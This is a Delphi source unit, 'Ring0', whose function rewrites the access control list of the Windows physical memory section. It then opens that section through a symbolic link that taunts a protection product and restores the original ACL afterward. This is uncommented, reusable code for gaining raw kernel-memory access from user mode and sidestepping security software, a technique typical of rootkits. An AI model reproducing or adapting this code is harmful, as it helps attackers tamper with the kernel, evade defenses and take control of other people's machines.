unit Ring0;

interface

uses
  Windows, WinNative, RTL, CAcl;

var
  pntkernel: PVOID;

function OpenPhysicalMemory(mAccess: dword): THandle;

implementation

function OpenPhysicalMemory(mAccess: dword): THandle;
var
  s1, PhysMemString: UNICODE_STRING;
  Attr: OBJECT_ATTRIBUTES;
  OldAcl, NewAcl: PACL;
  SD: PSECURITY_DESCRIPTOR;
  mHandle, sHandle: dword;
begin
  Result := 0;
  mHandle := 0;

  RtlInitUnicodeString(@PhysMemString, PhysicalMemory);
  InitializeObjectAttributes(@Attr, @PhysMemString, OBJ_CASE_INSENSITIVE or
    OBJ_KERNEL_HANDLE, 0, nil);

  if (ZwOpenSection(@mHandle, READ_CONTROL or
    WRITE_DAC, @Attr) <> STATUS_SUCCESS) then Exit;

  if Internal_GetKernelSecurityInfo(mHandle, DACL_SECURITY_INFORMATION, nil, nil,
    @OldAcl, nil, SD) <> ERROR_SUCCESS then Exit;

  NewAcl := nil;
  Cacl_SetEntryInACL(mAccess, OldAcl, @NewAcl);
  if (NewAcl <> nil) then
  begin
    if (Internal_SetKernelSecurityInfo(mHandle, DACL_SECURITY_INFORMATION, nil, nil, NewAcl, nil) = STATUS_SUCCESS) then
    begin
      RtlInitUnicodeString(@s1, '\BaseNamedObjects\dwprot_suxx_and_we_guarantee');
      InitializeObjectAttributes(@attr, @s1, OBJ_CASE_INSENSITIVE or OBJ_KERNEL_HANDLE, 0, nil);
      sHandle := 0;
      if (ZwCreateSymbolicLinkObject(@sHandle, SYMBOLIC_LINK_ALL_ACCESS, @attr, @PhysMemString) = STATUS_SUCCESS) then
      begin
        if (ZwOpenSection(@Result, mAccess, @attr) = STATUS_SUCCESS) then
        begin
          Internal_SetKernelSecurityInfo(mHandle, DACL_SECURITY_INFORMATION, nil, nil, OldAcl, nil);
        end;
      end;
    end;
    mem_free_(NewAcl);
  end;
  ZwClose(mHandle);

  mem_free_(SD);
end;

end.

